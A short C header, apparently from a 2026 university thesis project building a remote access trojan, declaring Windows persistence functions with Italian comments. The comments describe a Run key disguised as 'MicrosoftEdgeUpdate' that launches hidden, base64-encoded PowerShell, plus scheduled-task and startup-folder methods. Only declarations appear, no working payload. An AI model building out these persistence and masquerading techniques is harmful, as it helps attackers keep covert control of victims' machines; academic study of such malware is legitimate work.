/*
 * scheduled_task.h
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 */
#pragma once
#include <windows.h>

/*
 * install_run_key — persistenza fileless via PS stager
 * HKCU\...\Run\MicrosoftEdgeUpdate →
 *   powershell.exe -WindowStyle Hidden -EncodedCommand <BASE64>
 * Non richiede exe su disco. Ritorna 1 se ok.
 */
int install_run_key(void);

/*
 * install_persistence — task schedulata COM + Run key che puntano a exe_path.
 * Usato solo in Mode A (rundll32) e come fallback Mode C.
 */
int install_persistence(const wchar_t *exe_path, const wchar_t *arguments);

/* remove_persistence — rimuove task schedulata + Run key */
void remove_persistence(void);
int install_startup_folder(void);
int install_persistence_modeD(void);
